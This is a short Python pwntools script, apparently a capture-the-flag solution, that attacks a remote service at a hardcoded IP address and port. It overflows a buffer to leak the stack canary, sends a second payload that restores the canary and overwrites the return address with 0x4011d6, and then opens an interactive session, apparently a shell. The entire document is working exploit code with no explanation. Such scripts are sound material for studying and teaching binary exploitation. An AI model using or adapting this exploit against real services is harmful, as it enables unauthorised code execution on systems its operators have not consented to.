from pwn import*
context.log_level='debug'
p=remote('8.130.110.158',2106)

# p=process('./6')
# gdb.attach(p,'''
# b * 0x401234
# ''')
payload1=b'a'*(0x30-8)

# p.sendline(payload)
p.sendlineafter('name?',payload1)
# p.recvuntil(b'a'*(0x30-8))
p.recvuntil(b'\x0a')
p.recvuntil(b'\x0a')
# canary=u64(p.recv(7).ljust(8,b'\x00'))
canary=u64(b'\x00'+p.recv(7))
print(hex(canary))
payload2=b'\x00'*(0x30-8)+p64(canary)+p64(1)+p64(0x4011d6)
p.sendlineafter('say?',payload2)
p.interactive()